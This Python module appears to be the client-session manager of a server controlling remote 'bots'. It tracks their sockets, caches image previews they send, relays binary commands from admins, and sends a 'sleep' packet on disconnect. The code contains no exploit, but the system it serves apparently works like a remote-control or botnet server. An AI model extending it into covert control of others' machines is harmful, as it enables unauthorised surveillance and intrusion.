# backend/Services/ClientManager.py

import asyncio
from typing import Any, Dict, List, Optional, Tuple

import backend.LoggerWrapper as logger
from .network import pack_packet

# --- ХРАНИЛИЩА В ОПЕРАТИВНОЙ ПАМЯТИ ---

# active_clients: Хранит активные сетевые сессии.
# Ключ: bot_id (str), Значение: кортеж (asyncio.StreamReader, asyncio.StreamWriter)
active_clients: Dict[str, Tuple[asyncio.StreamReader, asyncio.StreamWriter]] = {}

# preview_cache: Хранит последнее полученное превью для каждого бота.
# Ключ: bot_id (str), Значение: сырые байты изображения (bytes)
# Благодаря использованию словаря, старое превью автоматически удаляется из RAM 
# при записи нового для того же bot_id.
preview_cache: Dict[str, bytes] = {}


# --- ФУНКЦИИ УПРАВЛЕНИЯ КЛИЕНТАМИ ---

async def close_client(bot_identifier: str, send_sleep_command: bool = True) -> bool:
    """
    Завершает сессию конкретного бота и очищает связанные с ним временные данные.
    """
    # Извлекаем сессию из активных клиентов
    client_session: Optional[Tuple[asyncio.StreamReader, asyncio.StreamWriter]] = active_clients.pop(
        bot_identifier, 
        None
    )

    if not client_session:
        return False

    reader, writer = client_session

    try:
        if send_sleep_command:
            # Отправляем пакет "усыпления" по стандарту V7.2 перед разрывом
            # Модуль System:None, Payload 'sleep'
            sleep_packet = pack_packet(bot_identifier, "System:None", "sleep")
            writer.write(sleep_packet)
            await writer.drain()
        
        # Закрываем соединение
        writer.close()
        await asyncio.wait_for(writer.wait_closed(), timeout=2.0)
    except Exception as e:
        logger.Log.debug(f"[ClientManager] Error during closing {bot_identifier}: {e}")
    finally:
        # Очищаем кэш превью при отключении бота, чтобы не тратить RAM на офлайн устройства
        if bot_identifier in preview_cache:
            del preview_cache[bot_identifier]
            
        logger.Log.info(f"[ClientManager] {bot_identifier} disconnected and resources cleared")
    
    return True


async def close_all_clients() -> int:
    """
    Массовое отключение всех активных ботов (например, при выключении сервера).
    """
    if not active_clients:
        return 0

    bot_identifiers: List[str] = list(active_clients.keys())
    # Запускаем задачи параллельно для скорости
    disconnection_tasks = [close_client(bot_id) for bot_id in bot_identifiers]
    
    results = await asyncio.gather(*disconnection_tasks)
    
    return len([res for res in results if res is True])


def list_clients() -> List[Dict[str, str]]:
    """
    Возвращает список идентификаторов всех ботов, находящихся в сети.
    """
    return [{"id": bot_id, "status": "online"} for bot_id in active_clients]


async def send_binary_to_bot(bot_identifier: str, binary_packet: bytes) -> bool:
    """
    Отправляет уже сформированный бинарный пакет напрямую в сокет бота.
    Используется для команд из API или транзитных пакетов от админов.
    """
    client_session: Optional[Tuple[asyncio.StreamReader, asyncio.StreamWriter]] = active_clients.get(
        bot_identifier
    )

    if not client_session:
        logger.Log.warning(f"[ClientManager] Attempted to send data to offline bot: {bot_identifier}")
        return False

    try:
        writer: asyncio.StreamWriter = client_session[1]
        writer.write(binary_packet)
        await writer.drain()
        return True
    except Exception as error:
        logger.Log.error(f"[ClientManager] Send error to {bot_identifier}: {error}")
        # Если отправка не удалась, вероятно соединение мертво
        asyncio.create_task(close_client(bot_identifier, send_sleep_command=False))
        return False


def get_preview(bot_identifier: str) -> Optional[bytes]:
    """
    Получает последнее сохраненное превью из кэша.
    """
    return preview_cache.get(bot_identifier)